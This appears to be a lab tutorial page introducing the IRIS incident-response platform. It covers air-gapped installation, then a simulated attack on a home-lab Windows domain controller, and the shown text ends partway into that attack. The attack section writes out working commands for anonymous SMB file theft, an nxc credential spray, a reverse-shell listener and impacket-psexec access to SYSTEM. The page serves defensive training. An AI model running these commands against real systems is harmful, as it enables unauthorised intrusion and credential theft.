+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="iris"><strong>IRIS</strong></h1>
+<p>IRIS is a digital platform built for collaboration among incident response analysts, enabling them to work together on detailed technical investigations. It can be set up on a standalone server or used as a portable application, making it suitable for on-the-go investigations in locations without internet access.</p>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/yOXxCxfta5I?si=ngYFNfkSRurHyoMA" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+<h2 id="lab-setup-for-proof-of-concept"><strong>Lab Setup for Proof of Concept</strong></h2>
+<p>In this proof of concept, an attack simulation was conducted on a Windows Virtual Machine (VM) using Kali Linux in a safe and controlled environment. Both IRIS and Splunk Enterprise were installed on an Ubuntu VM.</p>
+<p><strong>Note: Do not attempt to replicate the attack simulation demonstrated here unless you are properly trained and it is conducted in a secure and authorised manner. Unauthorised attack simulation can result in legal consequences and unintended damage to systems. Always ensure such activities are performed by qualified professionals in a secure, isolated environment.</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>Host</strong></th>
+<th><strong>OS</strong></th>
+<th><strong>Role</strong></th>
+<th><strong>IP Address</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Fortigate</td>
+<td>Fortios 7.6.0</td>
+<td>Firewall/Router</td>
+<td>192.168.1.111 (WAN) / 10.0.0.1 (LAN)</td>
+</tr>
+<tr>
+<td>Iris</td>
+<td>Ubuntu 22.04 LTS</td>
+<td>IRIS</td>
+<td>10.0.0.50</td>
+</tr>
+<tr>
+<td>Splunk</td>
+<td>Ubuntu 22.04 LTS</td>
+<td>Splunk Enterprise</td>
+<td>10.0.0.120</td>
+</tr>
+<tr>
+<td>WS2019</td>
+<td>Windows Server 2019</td>
+<td>Splunk Universal Forwarder, Domain Controller</td>
+<td>10.0.0.140</td>
+</tr>
+<tr>
+<td>Kali</td>
+<td>Kali Linux 2024.2</td>
+<td>Attacker machine</td>
+<td>10.0.0.29</td>
+</tr>
+</tbody>
+</table>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="IRIS_PoC.drawio.png" data-desc-position="bottom"><img alt="IRIS PoC.drawio.png" src="IRIS_PoC.drawio.png"></a></p>
+<h2 id="installing-iris-in-an-air-gapped-environment-ubuntu"><strong>Installing IRIS in an Air-gapped Environment (Ubuntu)</strong></h2>
+<p>These instructions cover downloading, transferring, and installing Docker Engine and IRIS in an air-gapped environment for Ubuntu 22.04.4 LTS. </p>
+<p><strong>Preparing the Folder Structure</strong></p>
+<p>On an internet-connected machine, create a structured directory</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>~/iris-offline/<span class="o">{</span>docker,docker-images<span class="o">}</span>
+</code></pre></div>
+<p>Navigate to <code>~/iris-offline/docker</code> and download Docker Engine and dependencies.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>curl<span class="w"> </span>-L<span class="w"> </span>https://get.docker.com<span class="w"> </span><span class="p">|</span><span class="w"> </span>sh
+</code></pre></div>
+<p>Alternatively, you can run the following commands:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">cd</span><span class="w"> </span>~/iris-offline/docker
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>wget<span class="w"> </span>https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/containerd.io_1.7.25-1_amd64.deb
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>wget<span class="w"> </span>https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-ce_28.0.0-1~ubuntu.22.04~jammy_amd64.deb
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>wget<span class="w"> </span>https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-ce-cli_28.0.0-1~ubuntu.22.04~jammy_amd64.deb
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>wget<span class="w"> </span>https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-buildx-plugin_0.21.0-1~ubuntu.22.04~jammy_amd64.deb
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>wget<span class="w"> </span>https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/docker-compose-plugin_2.33.0-1~ubuntu.22.04~jammy_amd64.deb
+</code></pre></div>
+<p>Install the&nbsp;<code>.deb</code>&nbsp;packages. Change directory into the docker folder and run:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">sudo</span> <span class="n">dpkg</span> <span class="o">-</span><span class="n">i</span> <span class="o">*</span>
+</code></pre></div>
+<p>Run <code>sudo service docker start</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">sudo</span> <span class="n">service</span> <span class="n">docker</span> <span class="n">start</span>
+</code></pre></div>
+<p>Run the following command to add your user to the <code>docker</code> group:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">sudo</span> <span class="n">usermod</span> <span class="o">-</span><span class="n">aG</span> <span class="n">docker</span> <span class="err">$</span><span class="p">(</span><span class="n">whoami</span><span class="p">)</span>
+</code></pre></div>
+<p>Reload the group membership for your current session with the following command:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">newgrp</span> <span class="n">docker</span>
+</code></pre></div>
+<p>Check if you can run Docker commands without <code>sudo</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">docker</span> <span class="n">ps</span>
+</code></pre></div>
+<p>Clone the IRIS GitHub repository as a zip archive from the <a href="https://github.com/dfir-iris/iris-web">IRIS GitHub</a> page. </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">cd</span> <span class="o">~/</span><span class="n">iris</span><span class="o">-</span><span class="n">offline</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="n">sudo</span> <span class="n">apt</span> <span class="n">update</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="n">sudo</span> <span class="n">apt</span> <span class="n">install</span> <span class="n">git</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">dfir</span><span class="o">-</span><span class="n">iris</span><span class="o">/</span><span class="n">iris</span><span class="o">-</span><span class="n">web</span><span class="o">.</span><span class="n">git</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="n">cd</span> <span class="n">iris</span><span class="o">-</span><span class="n">web</span>
+</code></pre></div>
+<p>Check out the latest&nbsp;non-beta&nbsp;tagged version:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">git</span> <span class="n">checkout</span> <span class="n">v2</span><span class="mf">.4.20</span>
+</code></pre></div>
+<p><strong>Note:</strong> If you are working in an air-gapped environment where Git is not installed, skip this step and ensure that the contents of the <code>.env</code> file match those of the <code>.env.model</code> file.</p>
+<p>Copy the environment file</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">cp</span> <span class="o">.</span><span class="n">env</span><span class="o">.</span><span class="n">model</span> <span class="o">.</span><span class="n">env</span>
+</code></pre></div>
+<p><strong>Note:</strong> The default configuration is suitable for testing only. To configure IRIS for production, see the&nbsp;<a href="https://docs.dfir-iris.org/2.4.16/operations/configuration/">configuration section</a>.
+Pull all required Docker images on a system with internet access:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">docker</span> <span class="n">compose</span> <span class="n">pull</span> 
+</code></pre></div>
+<p>Verify that Docker images have been pulled successfully:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">docker</span> <span class="n">images</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">REPOSITORY</span>                           <span class="n">TAG</span>                   <span class="n">IMAGE</span> <span class="n">ID</span>       <span class="n">CREATED</span>        <span class="n">SIZE</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="n">ghcr</span><span class="o">.</span><span class="n">io</span><span class="o">/</span><span class="n">dfir</span><span class="o">-</span><span class="n">iris</span><span class="o">/</span><span class="n">iriswebapp_app</span>     <span class="n">latest</span>                <span class="mi">964</span><span class="n">d171dbb2b</span>   <span class="mi">4</span> <span class="n">days</span> <span class="n">ago</span>     <span class="mf">1.27</span><span class="n">GB</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="n">ghcr</span><span class="o">.</span><span class="n">io</span><span class="o">/</span><span class="n">dfir</span><span class="o">-</span><span class="n">iris</span><span class="o">/</span><span class="n">iriswebapp_nginx</span>   <span class="n">latest</span>                <span class="n">eec0b38cb17d</span>   <span class="mi">4</span> <span class="n">days</span> <span class="n">ago</span>     <span class="mi">211</span><span class="n">MB</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="n">ghcr</span><span class="o">.</span><span class="n">io</span><span class="o">/</span><span class="n">dfir</span><span class="o">-</span><span class="n">iris</span><span class="o">/</span><span class="n">iriswebapp_db</span>      <span class="n">latest</span>                <span class="mi">9795</span><span class="n">f95185ef</span>   <span class="mi">4</span> <span class="n">days</span> <span class="n">ago</span>     <span class="mi">266</span><span class="n">MB</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="n">rabbitmq</span>                             <span class="mi">3</span><span class="o">-</span><span class="n">management</span><span class="o">-</span><span class="n">alpine</span>   <span class="n">e9a8d679cd6f</span>   <span class="mi">2</span> <span class="n">months</span> <span class="n">ago</span>   <span class="mi">178</span><span class="n">MB</span>
+</code></pre></div>
+<p>After pulling the images, save them as <code>.tar</code> files in the <code>~/docker-images</code> folder.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">cd</span> <span class="o">~/</span><span class="n">iris</span><span class="o">-</span><span class="n">offline</span><span class="o">/</span><span class="n">docker</span><span class="o">-</span><span class="n">images</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="n">docker</span> <span class="n">save</span> <span class="o">-</span><span class="n">o</span> <span class="n">iris_db</span><span class="o">.</span><span class="n">tar</span> <span class="n">ghcr</span><span class="o">.</span><span class="n">io</span><span class="o">/</span><span class="n">dfir</span><span class="o">-</span><span class="n">iris</span><span class="o">/</span><span class="n">iriswebapp_db</span><span class="p">:</span><span class="n">latest</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="n">docker</span> <span class="n">save</span> <span class="o">-</span><span class="n">o</span> <span class="n">iris_app</span><span class="o">.</span><span class="n">tar</span> <span class="n">ghcr</span><span class="o">.</span><span class="n">io</span><span class="o">/</span><span class="n">dfir</span><span class="o">-</span><span class="n">iris</span><span class="o">/</span><span class="n">iriswebapp_app</span><span class="p">:</span><span class="n">latest</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="n">docker</span> <span class="n">save</span> <span class="o">-</span><span class="n">o</span> <span class="n">iris_nginx</span><span class="o">.</span><span class="n">tar</span> <span class="n">ghcr</span><span class="o">.</span><span class="n">io</span><span class="o">/</span><span class="n">dfir</span><span class="o">-</span><span class="n">iris</span><span class="o">/</span><span class="n">iriswebapp_nginx</span><span class="p">:</span><span class="n">latest</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="n">docker</span> <span class="n">save</span> <span class="o">-</span><span class="n">o</span> <span class="n">rabbitmq</span><span class="o">.</span><span class="n">tar</span> <span class="n">rabbitmq</span><span class="p">:</span><span class="mi">3</span><span class="o">-</span><span class="n">management</span><span class="o">-</span><span class="n">alpine</span>
+</code></pre></div>
+<p>Compress <code>iris-offline</code> for transfer</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="nb">cd</span><span class="w"> </span>~/iris-offline
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>tar<span class="w"> </span>-czvf<span class="w"> </span>iris-offline.tar.gz<span class="w"> </span>*
+</code></pre></div>
+<p>Transfer <code>iris-offline.tar.gz</code> to the air-gapped Ubuntu VM using a USB drive.</p>
+<p><strong>Installing IRIS in the Air-Gapped Environment</strong></p>
+<p>Extract the transferred archive.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="nb">cd</span><span class="w"> </span>~
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>tar<span class="w"> </span>-xzvf<span class="w"> </span>iris-offline.tar.gz
+</code></pre></div>
+<p>Install Docker.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nb">cd</span><span class="w"> </span>~/iris-offline/docker
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>-i<span class="w"> </span>*.deb
+</code></pre></div>
+<p>Run <code>sudo service docker start</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">sudo</span> <span class="n">service</span> <span class="n">docker</span> <span class="n">start</span>
+</code></pre></div>
+<p>Run the following command to add your user to the <code>docker</code> group:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">sudo</span> <span class="n">usermod</span> <span class="o">-</span><span class="n">aG</span> <span class="n">docker</span> <span class="err">$</span><span class="n">USER</span>
+</code></pre></div>
+<p>Reload the group membership for your current session with the following command:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">newgrp</span> <span class="n">docker</span>
+</code></pre></div>
+<p>Check if you can run Docker commands without <code>sudo</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">docker</span> <span class="n">ps</span>
+</code></pre></div>
+<p>Load transferred docker images.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">cd</span> <span class="o">~/</span><span class="n">iris</span><span class="o">-</span><span class="n">offline</span><span class="o">/</span><span class="n">docker</span><span class="o">-</span><span class="n">images</span>
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="n">docker</span> <span class="n">load</span> <span class="o">-</span><span class="n">i</span> <span class="n">iris_db</span><span class="o">.</span><span class="n">tar</span>
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="n">docker</span> <span class="n">load</span> <span class="o">-</span><span class="n">i</span> <span class="n">iris_app</span><span class="o">.</span><span class="n">tar</span>
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="n">docker</span> <span class="n">load</span> <span class="o">-</span><span class="n">i</span> <span class="n">iris_nginx</span><span class="o">.</span><span class="n">tar</span>
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="n">docker</span> <span class="n">load</span> <span class="o">-</span><span class="n">i</span> <span class="n">rabbitmq</span><span class="o">.</span><span class="n">tar</span>
+</code></pre></div>
+<p>Once the images are loaded, run IRIS:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c1"># Add "-d" to put it in the background</span>
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="n">docker</span> <span class="n">compose</span> <span class="n">up</span>
+</code></pre></div>
+<p>IRIS should now be accessible on your host interface via the HTTPS protocol, with port 443 used by default. You can open it in your web browser at <code>https://hostip</code>. If prompted with a warning about a self-signed certificate, click <strong>Advanced</strong>, then select <strong>Accept the Risk and Continue</strong>.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image.png" data-desc-position="bottom"><img alt="image.png" src="image.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%201.png" data-desc-position="bottom"><img alt="image.png" src="image%201.png"></a></p>
+<p>When starting for the first time, an administrator account is automatically created. The password is displayed in the console output and can be located in the logs by searching for <code>WARNING :: post_init :: create_safe_admin</code>. Alternatively, you can set an admin password during the initial startup by specifying it in the <code>.env</code> file using the <code>IRIS_ADM_PASSWORD</code> environment variable. Please note that this option has no effect after the administrator account has been created.</p>
+<p><strong>Note: The username is "administrator" with a lowercase "a", not an uppercase "A".</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="n">sudo</span> <span class="n">docker</span> <span class="n">compose</span> <span class="n">logs</span> <span class="n">app</span> <span class="o">|</span> <span class="n">grep</span> <span class="s2">"WARNING :: post_init :: create_safe_admin"</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="n">iriswebapp_app</span>  <span class="o">|</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">23</span> <span class="mi">07</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">05</span> <span class="p">::</span> <span class="n">WARNING</span> <span class="p">::</span> <span class="n">post_init</span> <span class="p">::</span> <span class="n">create_safe_admin</span> <span class="p">::</span> <span class="o">&gt;&gt;&gt;</span> <span class="n">Administrator</span> <span class="n">password</span><span class="p">:</span> <span class="n">Gk</span><span class="o">@</span><span class="c1">#PklyAYEy0x&amp;s</span>
+</code></pre></div>
+<p>If the password is not visible in the logs, try running <code>docker compose logs app | grep "WARNING :: post_init :: create_safe_admin"</code>. If the logs show that the user <code>administrator</code> has already been created, it indicates the instance has been started before, and the password is already set. In this case, refer to the recovery options.</p>
+<h2 id="attack-simulation"><strong>Attack Simulation</strong></h2>
+<p>The smbclient tool on a Kali machine was used to connect to an SMB share hosted on <strong>WS2019</strong> at <strong>10.0.0.140</strong>. After logging in anonymously, the share’s contents were listed, a file (<strong>user_credentials.xlsx</strong>) was downloaded, and the session was exited.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="err">└─$</span> <span class="n">smbclient</span> <span class="o">//</span><span class="mf">10.0.0.140</span><span class="o">/</span><span class="n">Shares</span>
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="n">Password</span> <span class="k">for</span> <span class="p">[</span><span class="n">WORKGROUP</span>\<span class="n">kali</span><span class="p">]:</span>
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="n">Anonymous</span> <span class="n">login</span> <span class="n">successful</span>
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="n">Try</span> <span class="s2">"help"</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">possible</span> <span class="n">commands</span><span class="o">.</span>
+<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="n">ls</span>
+<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>  <span class="o">.</span>                                   <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Sat</span> <span class="n">Dec</span> <span class="mi">14</span> <span class="mi">06</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">10</span> <span class="mi">2024</span>
+<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>  <span class="o">..</span>                                  <span class="n">D</span>        <span class="mi">0</span>  <span class="n">Sat</span> <span class="n">Dec</span> <span class="mi">14</span> <span class="mi">06</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">10</span> <span class="mi">2024</span>
+<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>  <span class="n">user_credentials</span><span class="o">.</span><span class="n">xlsx</span>               <span class="n">A</span>     <span class="mi">9387</span>  <span class="n">Sat</span> <span class="n">Dec</span> <span class="mi">14</span> <span class="mi">06</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">40</span> <span class="mi">2024</span>
+<a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>
+<a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>                <span class="mi">15570943</span> <span class="n">blocks</span> <span class="n">of</span> <span class="n">size</span> <span class="mf">4096.</span> <span class="mi">11749781</span> <span class="n">blocks</span> <span class="n">available</span>
+<a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a><span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="n">get</span> <span class="n">user_credentials</span><span class="o">.</span><span class="n">xlsx</span> 
+<a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a><span class="n">getting</span> <span class="n">file</span> \<span class="n">user_credentials</span><span class="o">.</span><span class="n">xlsx</span> <span class="n">of</span> <span class="n">size</span> <span class="mi">9387</span> <span class="k">as</span> <span class="n">user_credentials</span><span class="o">.</span><span class="n">xlsx</span> <span class="p">(</span><span class="mf">327.4</span> <span class="n">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span> <span class="p">(</span><span class="n">average</span> <span class="mf">327.4</span> <span class="n">KiloBytes</span><span class="o">/</span><span class="n">sec</span><span class="p">)</span>
+<a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a><span class="n">smb</span><span class="p">:</span> \<span class="o">&gt;</span> <span class="n">exit</span>
+</code></pre></div>
+<p>The <strong>user_credentials.xlsx</strong> file revealed the credentials for a domain account named <strong>Splunk</strong>. Based on this information, a list of usernames and passwords was created. A credential spray was conducted using <strong>nxc smb</strong> with these usernames and passwords, which revealed that the <strong>Domain Administrator</strong> account was using the same password.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%202.png" data-desc-position="bottom"><img alt="image.png" src="image%202.png"></a></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="err">└─$</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="mf">10.0.0.0</span><span class="o">/</span><span class="mi">24</span> <span class="o">-</span><span class="n">u</span> <span class="n">usernames</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">p</span> <span class="n">passwords</span><span class="o">.</span><span class="n">txt</span> <span class="o">--</span><span class="n">shares</span> <span class="o">--</span><span class="k">continue</span><span class="o">-</span><span class="n">on</span><span class="o">-</span><span class="n">success</span>
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span>
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="n">SMB</span>         <span class="mf">10.0.0.140</span>      <span class="mi">445</span>    <span class="n">WS2019</span>           <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">cyber</span><span class="o">.</span><span class="n">local</span>\<span class="n">administrator</span><span class="p">:</span><span class="n">P</span><span class="nd">@ssw0rd</span> <span class="p">(</span><span class="n">Pwn3d</span><span class="err">!</span><span class="p">)</span>
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="n">SMB</span>         <span class="mf">10.0.0.140</span>      <span class="mi">445</span>    <span class="n">WS2019</span>           <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">cyber</span><span class="o">.</span><span class="n">local</span>\<span class="n">splunk</span><span class="p">:</span><span class="n">P</span><span class="nd">@ssw0rd</span>
+</code></pre></div>
+<p>IT Support was impersonated to send a phishing email to a user. The email included a link directing to a Kali machine hosting <code>setup.exe</code> on an HTTP server. The <code>setup.exe</code> file was a reverse shell payload designed to connect back to the Kali machine on port 443.</p>
+<p>After setting up a listener on port 443 and manually executing <code>setup.exe</code> (with Windows Defender disabled), a reverse shell was successfully obtained.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%203.png" data-desc-position="bottom"><img alt="image.png" src="image%203.png"></a></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="err">└─$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">nvlp</span> <span class="mi">443</span>
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="nb">any</span><span class="p">]</span> <span class="mi">443</span> <span class="o">...</span>
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.0.0.29</span><span class="p">]</span> <span class="kn">from</span><span class="w"> </span><span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.0.0.140</span><span class="p">]</span> <span class="mi">61202</span>
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0.17763.3650</span><span class="p">]</span>
+<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2018</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="o">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>
+<a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>
+<a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Downloads</span><span class="o">&gt;</span><span class="n">whoami</span>
+<a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a><span class="n">whoami</span>
+<a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a><span class="n">cyber</span>\<span class="n">administrator</span>
+<a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a>
+<a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Downloads</span><span class="o">&gt;</span>
+</code></pre></div>
+<p>Using the previously obtained Domain Administrator credentials from password spraying, <strong>impacket-psexec</strong> was utilised to gain access to <strong>WS2019</strong> with <strong>NT AUTHORITY\SYSTEM</strong> privileges.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="err">└─$</span> <span class="n">impacket</span><span class="o">-</span><span class="n">psexec</span> <span class="n">administrator</span><span class="p">:</span><span class="n">P</span><span class="nd">@ssw0rd</span><span class="o">@</span><span class="mf">10.0.0.140</span> 
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 
+<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>
+<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">shares</span> <span class="n">on</span> <span class="mf">10.0.0.140</span><span class="o">.....</span>
